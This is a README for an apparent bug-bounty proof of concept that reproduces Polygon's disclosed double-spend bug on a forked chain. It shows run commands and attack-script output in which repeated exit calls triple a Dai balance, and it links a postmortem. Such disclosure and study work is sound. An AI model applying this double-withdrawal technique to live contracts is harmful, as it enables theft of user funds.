# Polygon PoC

## How to run

Install brownie first

Set up the environment variable for $ARCHIVENODE_TOKEN 

```
export $ARCHIVENODE_TOKEN = xxxxx
sh start_archive.sh

then 

sh run.sh
```

```
Running 'scripts/attack.py::main'...
------ Exploit: verifyInclusion byte discard bug ------------
🧛 before:  balance is 0.0 Dai
------> Step 1: call processExits() to make a normal withdrawal
Transaction sent: 0xf54e0cd4996ec0a3523c017ed1b61f2a494c3e2b7ffc9c9bf6360c98354d9093
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 223
  Transaction confirmed   Block: 13260336   Gas used: 132896 (1.98%)

🧛 After:  balance is 33000.0 Dai
------> Step 2: call startExitWithBurntTokens() repeatedly to mint ExitNFT
Transaction sent: 0x82203a44ce765ca55e39e6e811663ab49bc7d9b68599dfe902098ebe3fbb3067
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 224
  Transaction confirmed   Block: 13260337   Gas used: 381572 (5.68%)

Transaction sent: 0x6bd72f6dedadea65c599318ac935e61d2f22d2a1dfe198f08a137b4040e59890
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 225
  Transaction confirmed   Block: 13260338   Gas used: 381572 (5.68%)

🧛 before:  balance is 33000.0 Dai
------> Step 3: call processExits() to make multiple withdrawals
Transaction sent: 0xf301cf02c17ee2504bd532efa244e0622151f94525d1dfed91b69db07b23631e
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 226
  Transaction confirmed   Block: 13260339   Gas used: 122391 (1.82%)

🧛 After:  balance is 99000.0 Dai

```
> The block number this poc select is 13260334

## link 

* https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1
